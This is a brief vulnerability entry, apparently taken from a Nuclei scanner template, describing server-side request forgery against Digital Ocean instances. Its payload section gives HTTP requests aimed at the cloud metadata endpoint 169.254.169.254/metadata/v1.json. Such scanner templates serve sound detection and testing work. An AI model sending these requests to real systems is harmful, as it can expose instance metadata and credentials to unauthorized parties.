# Vulnerability: Digital Ocean - Server-side request forgery (SSRF)
**Classification:** CWE-918
**Source:** Nuclei Template (`digital-ocean-ssrf.yaml`)

## Description
Digital Ocean instance is vulnerable to SSRF.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/metadata/v1.json HTTP/1.1
Host: {{Hostname}}

@tls-sni: {{Hostname}}
GET http://169.254.169.254/metadata/v1.json HTTP/1.1
Host: {{Hostname}}
```

